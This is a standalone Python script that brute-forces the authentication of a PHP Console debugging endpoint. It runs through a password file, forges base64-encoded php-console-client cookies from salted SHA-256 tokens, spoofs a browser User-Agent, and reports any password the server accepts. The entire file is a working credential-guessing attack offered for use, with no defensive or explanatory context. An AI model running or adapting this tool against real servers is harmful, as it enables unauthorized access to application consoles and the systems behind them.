import base64
import hashlib
import re
import sys

import requests

# TODO add threads
try:
    PUBLIC_KEY = sys.argv[3]
    PASS_FILE = sys.argv[1]
    URL = sys.argv[2]
    SALT = sys.argv[4]
except IndexError as e:
    print(f"usage: {sys.argv[0]} <password-file>  <target-url>  <public-key>  <\"salt\">")
    sys.exit(0)
except Exception as e:
    print(e)
    sys.exit(0)
SUCCESS_RE = re.compile('.*(\"isSuccess":true\}).*')
SUCCESS = False
RETRIES = 3


def try_pass(password):
    phash = hashlib.sha256((line.strip() + SALT).encode()).hexdigest()
    token = hashlib.sha256((phash + PUBLIC_KEY).encode()).hexdigest()
    data = '{"php-console-client":5,"auth":{"publicKey":"' + PUBLIC_KEY + '","token":"' + token + '"}}'
    payload = base64.b64encode(data.encode()).decode()
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Cookie': f'php-console-server=5; php-console-client={payload}'
    }
    response = requests.get(URL, headers=headers)
    if SUCCESS_RE.match(response.headers['PHP-Console']) or SUCCESS_RE.match(response.headers['php-console']):
        return response.headers
    return None


with open(PASS_FILE, 'r') as passwords:
    for line in passwords.readlines():
        i = 0
        print(f"Trying: {line.strip()}")
        while i < RETRIES:
            try:
                result = try_pass(line)
                if result:
                    print(line + ":", result)
                    break
            except requests.ConnectionError:
                i = i + 1
                continue
            break
